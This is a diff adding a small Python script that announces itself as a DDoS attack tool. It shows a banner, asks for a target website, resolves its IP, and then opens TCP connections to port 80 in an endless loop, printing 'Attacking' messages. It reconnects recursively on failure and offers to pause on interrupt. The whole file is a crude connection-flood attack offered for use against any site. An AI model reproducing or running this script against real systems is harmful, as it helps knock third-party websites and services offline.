@@ -1,0 +1,54 @@
+import sys,time,socket,os
+os.system('clear')
+def slowtype(text,sec):
+    for d in text + "\n":
+        sys.stdout.write(d)
+        sys.stdout.flush()
+        time.sleep(sec/100)
+        #############
+slowtype("""\033[;33;1m  
+ .----.  .----. .----.  .--.  
+/  {}  \{ {__  { {__   / {} \ 
+\      /.-._} }.-._} }/  /\  \
+ `----' `----' `----' `-'  `-'               
+""",4)
+slowtype("""\033[;36;1m this is stronger tool to do ddos attak""",6)
+slowtype('_________________________________________',6)
+print('')
+print('')
+ip = input('\033[1;33;40m Enter www.name of web.com: ')
+try:
+    Web_ip = socket.gethostbyname(ip)
+except:
+    print()
+    print("URL Without (->( HTTP:// OR HTTPS:// )<-)")
+    time.sleep(2)
+    exit()
+print()
+print(f"-| Host: {ip} -|- IP: {Web_ip} |-")
+print()
+print("0-<___________-+-___________>-0")
+print()
+time.sleep(2)
+def con():
+    while True:
+        try:
+            sock=socket.socket(socket.AF_INET ,socket.SOCK_STREAM)
+            conn = sock.connect_ex((ip,80))
+            data = "[√√√ ]Attacking by alhacker alarby: {} : Port: {}".format(ip,"80")
+            if conn == 0:
+                print(data)
+            else:
+                if conn != 0:
+                    con()
+        except KeyboardInterrupt:
+            def ex():
+                pause = input("Attack Is Stoped Do u want Continue? (Y , N): ")
+                if pause == "Y" or pause == "y":
+                    con()
+                if pause == "N" or pause == "n":
+                    exit()
+                else:
+                    ex()
+            ex()
+con()
